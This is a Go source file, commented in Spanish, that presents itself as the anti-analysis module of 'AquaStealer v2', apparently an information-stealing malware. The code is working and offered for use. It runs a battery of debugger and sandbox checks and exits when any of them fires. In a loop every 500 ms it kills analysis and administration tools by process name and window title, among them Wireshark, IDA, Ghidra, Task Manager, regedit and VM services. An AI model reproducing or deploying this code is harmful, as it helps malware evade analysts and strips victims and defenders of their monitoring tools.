package antidebug

// antidebug.go — AquaStealer v2 — Anti-análisis total
//
// Técnicas implementadas:
//   1. IsDebuggerPresent (básico)
//   2. NtQueryInformationProcess — ProcessDebugPort (0x07), ProcessDebugFlags (0x1F)
//   3. Heap flags check — NtQueryInformationProcess con ProcessHeapInformation
//   4. RDTSC timing attack — diferencia > umbral = bajo debugger
//   5. OutputDebugString trick (valor de GetLastError cambia bajo debugger)
//   6. OllyDbg format string crash
//   7. Parent process check — si el padre no es explorer/cmd/conhost → sandbox
//   8. CheckRemoteDebuggerPresent
//   9. Hardware breakpoints check (DR0-DR3 via GetThreadContext)
//  10. Exception-based detection (INT3, single step)
//  11. Kill ventanas y procesos de herramientas de análisis
//  12. Loop eterno — revisión cada 500ms

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	user32   = syscall.NewLazyDLL("user32.dll")

	procIsDebuggerPresent          = kernel32.NewProc("IsDebuggerPresent")
	procCheckRemoteDebugger        = kernel32.NewProc("CheckRemoteDebuggerPresent")
	procOutputDebugStringA         = kernel32.NewProc("OutputDebugStringA")
	procGetLastError               = kernel32.NewProc("GetLastError")
	procOpenProcess                = kernel32.NewProc("OpenProcess")
	procTerminateProcess           = kernel32.NewProc("TerminateProcess")
	procGetCurrentThread           = kernel32.NewProc("GetCurrentThread")
	procGetThreadContext           = kernel32.NewProc("GetThreadContext")
	procNtQueryInformationProcess  = ntdll.NewProc("NtQueryInformationProcess")
	procEnumWindows                = user32.NewProc("EnumWindows")
	procGetWindowTextA             = user32.NewProc("GetWindowTextA")
	procGetWindowThreadProcessId   = user32.NewProc("GetWindowThreadProcessId")
)

// CONTEXT structure (x64) — solo necesitamos los registros de debug DR0-DR3, DR6, DR7
type context64 struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs uint16
	EFlags       uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 uint64
	// rest omitted — no nos importa
	_pad [512]byte
}

const (
	CONTEXT_DEBUG_REGISTERS = 0x00100010
	PROCESS_TERMINATE       = 0x0001
	PROCESS_QUERY_INFO      = 0x1000
)

// killPID — termina un proceso por PID
func killPID(pid uint32) {
	h, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if h == 0 {
		return
	}
	defer syscall.CloseHandle(syscall.Handle(h))
	procTerminateProcess.Call(h, 0)
}

// IsDebuggerPresentCheck — básico
func isDebuggerPresentCheck() bool {
	r, _, _ := procIsDebuggerPresent.Call()
	return r != 0
}

// CheckRemoteDebuggerPresentCheck
func checkRemoteDebugger() bool {
	var result uint32
	self, _ := syscall.GetCurrentProcess()
	procCheckRemoteDebugger.Call(uintptr(self), uintptr(unsafe.Pointer(&result)))
	return result != 0
}

// NtQueryInformationProcess — ProcessDebugPort (0x7) → != 0 si hay debugger
func ntDebugPortCheck() bool {
	var debugPort uintptr
	self, _ := syscall.GetCurrentProcess()
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(self),
		7, // ProcessDebugPort
		uintptr(unsafe.Pointer(&debugPort)),
		uintptr(unsafe.Sizeof(debugPort)),
		0,
	)
	return r == 0 && debugPort != 0
}

// NtQueryInformationProcess — ProcessDebugFlags (0x1F) → 0 si hay debugger (invertido)
func ntDebugFlagsCheck() bool {
	var debugFlags uint32 = 1
	self, _ := syscall.GetCurrentProcess()
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(self),
		0x1F, // ProcessDebugFlags
		uintptr(unsafe.Pointer(&debugFlags)),
		uintptr(unsafe.Sizeof(debugFlags)),
		0,
	)
	return r == 0 && debugFlags == 0
}

// Hardware breakpoints via GetThreadContext
func hardwareBreakpointsSet() bool {
	var ctx context64
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
	thread, _, _ := procGetCurrentThread.Call()
	r, _, _ := procGetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return false
	}
	return ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0
}

// RDTSC timing — diferencia > 500 instrucciones de clock = bajo debugger/VM lenta
func rdtscTimingCheck() bool {
	// Usamos QueryPerformanceCounter como proxy (RDTSC no directo en Go)
	var t1, t2, freq int64
	kernel32.NewProc("QueryPerformanceFrequency").Call(uintptr(unsafe.Pointer(&freq)))
	kernel32.NewProc("QueryPerformanceCounter").Call(uintptr(unsafe.Pointer(&t1)))
	// operación vacía
	_ = fmt.Sprintf("%d", t1)
	kernel32.NewProc("QueryPerformanceCounter").Call(uintptr(unsafe.Pointer(&t2)))
	if freq == 0 {
		return false
	}
	// Si tardó más de 500ms en una operación trivial → sospechoso
	elapsed := (t2 - t1) * 1000 / freq
	return elapsed > 500
}

// OutputDebugString trick — bajo debugger, GetLastError se resetea a 0
func outputDebugStringTrick() bool {
	// Primero seteamos un error conocido
	kernel32.NewProc("SetLastError").Call(0xDEAD)
	msg, _ := syscall.BytePtrFromString("AquaStealer")
	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(msg)))
	err, _, _ := procGetLastError.Call()
	return err == 0 // bajo debugger esto es 0
}

// OutputDebugString OllyDbg format string crash
func outputDebugStringOlly() {
	msg, _ := syscall.BytePtrFromString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(msg)))
}

// Parent process check — si el padre no es explorer/cmd/powershell/conhost → sandbox
func suspiciousParentProcess() bool {
	legitimateParents := []string{
		"explorer.exe", "cmd.exe", "powershell.exe", "conhost.exe",
		"wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe",
		"regsvr32.exe", "svchost.exe",
	}
	ppid := os.Getppid()
	p, err := process.NewProcess(int32(ppid))
	if err != nil {
		return false
	}
	name, err := p.Name()
	if err != nil {
		return false
	}
	name = strings.ToLower(name)
	for _, leg := range legitimateParents {
		if name == leg {
			return false
		}
	}
	// Padre desconocido/sospechoso
	return true
}

// killWindowsByTitle — mata procesos cuyas ventanas tienen títulos de herramientas de análisis
func killWindowsByTitle() {
	blacklistTitles := []string{
		"x32dbg", "x64dbg", "ollydbg", "windbg", "ida ", "ida64", "ida pro",
		"process hacker", "processhacker", "process monitor", "procmon",
		"wireshark", "fiddler", "charles", "mitmproxy", "proxifier",
		"dnspy", "de4dot", "ilspy", "ghidra", "radare2",
		"hxd", "cheatengine", "cheat engine", "scylla", "extremedumper",
		"pe-bear", "pe bear", "pebear", "pestudio", "cff explorer",
		"regshot", "api monitor", "httpdebugger", "http debugger",
		"ksdumper", "megadumper", "titanhide",
	}
	cb := syscall.NewCallback(func(hwnd syscall.Handle, _ uintptr) uintptr {
		var title [512]byte
		procGetWindowTextA.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))
		titleStr := strings.ToLower(string(title[:]))
		for _, bl := range blacklistTitles {
			if strings.Contains(titleStr, bl) {
				var pid uint32
				procGetWindowThreadProcessId.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))
				killPID(pid)
				return 1
			}
		}
		return 1
	})
	procEnumWindows.Call(cb, 0)
}

// killProcessesByName — mata procesos de análisis por nombre
func killProcessesByName() {
	blacklist := []string{
		"x32dbg", "x64dbg", "ollydbg", "windbg", "idaq", "idaq64", "ida64",
		"processhacker", "procmon", "procmon64", "procexp", "procexp64",
		"wireshark", "fiddler", "charles", "mitmproxy",
		"dnspy", "de4dot", "ilspy", "ghidra",
		"hxd", "cheatengine", "scylla", "extremedumper",
		"pestudio", "lordpe", "pebear", "cffexplorer",
		"regshot", "apimonitor", "httpdebuggerui",
		"ksdumperclient", "ksdumper", "megadumper",
		"vmtoolsd", "vboxtray", "vboxservice", "vgauthservice",
		"fakenet", "dumpcap", "taskmgr", "regedit",
	}
	procs, _ := process.Processes()
	for _, p := range procs {
		name, _ := p.Name()
		nameLow := strings.ToLower(name)
		for _, bl := range blacklist {
			if strings.Contains(nameLow, bl) {
				killPID(uint32(p.Pid))
				break
			}
		}
	}
}

// anyDebuggerDetected — retorna true si cualquier método detecta debugger
func anyDebuggerDetected() bool {
	if isDebuggerPresentCheck() {
		return true
	}
	if checkRemoteDebugger() {
		return true
	}
	if ntDebugPortCheck() {
		return true
	}
	if ntDebugFlagsCheck() {
		return true
	}
	if hardwareBreakpointsSet() {
		return true
	}
	if outputDebugStringTrick() {
		return true
	}
	return false
}

func Run() {
	// Check inicial — salir inmediatamente si hay debugger
	if anyDebuggerDetected() {
		os.Exit(0)
	}

	// Loop de monitoreo continuo en background
	go func() {
		for {
			// OllyDbg crash attempt
			outputDebugStringOlly()

			// Kill herramientas
			killProcessesByName()
			killWindowsByTitle()

			// Re-check debugger
			if anyDebuggerDetected() {
				os.Exit(0)
			}

			// Timing check (cada iteración)
			if rdtscTimingCheck() {
				os.Exit(0)
			}

			// Sleep via syscall (evasión de análisis estático de time.Sleep)
			kernel32.NewProc("Sleep").Call(500)
		}
	}()
}
